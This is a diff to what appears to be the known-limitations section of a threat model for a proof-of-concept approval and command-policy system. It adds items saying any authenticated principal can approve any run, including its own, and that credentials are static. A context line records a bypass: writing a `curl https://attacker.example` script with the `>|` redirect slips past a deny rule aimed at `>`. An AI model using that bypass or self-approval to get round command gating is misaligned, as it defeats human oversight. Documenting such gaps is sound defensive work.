@@ -162,8 +162,13 @@ budget default. These are recorded per-threat in the register.
   `echo 'curl https://attacker.example' >| run.sh && bash run.sh` is allowed
   while the `>` form is denied. Quote-aware redirect scanning was deliberately
   out of scope; the two regexes should be one.
-- **Approver identity is a label,** not an authenticated principal — this POC has
-  no identity system; real segregation of duties plugs in here.
+- **Any principal may approve anything.** `resolvedBy` is now an authenticated
+  principal derived from the credential and cannot be asserted by a client, but
+  authentication is not authorization: there are no roles, and nothing stops the
+  principal behind a held run from approving it. Four-eyes needs runs attributed
+  to a requesting principal, which the store does not record.
+- **The principal registry is static.** Adding, rotating, or revoking a
+  credential is an environment change plus a restart.
 - **Audit retention depends on config** (TM-OPS-001) — `policyEvents`/resolved
   `approvals` are pruned past `AUDIT_RETENTION_DAYS` on every store write; a
   misconfigured (too-long) default is the residual risk, not unbounded growth.
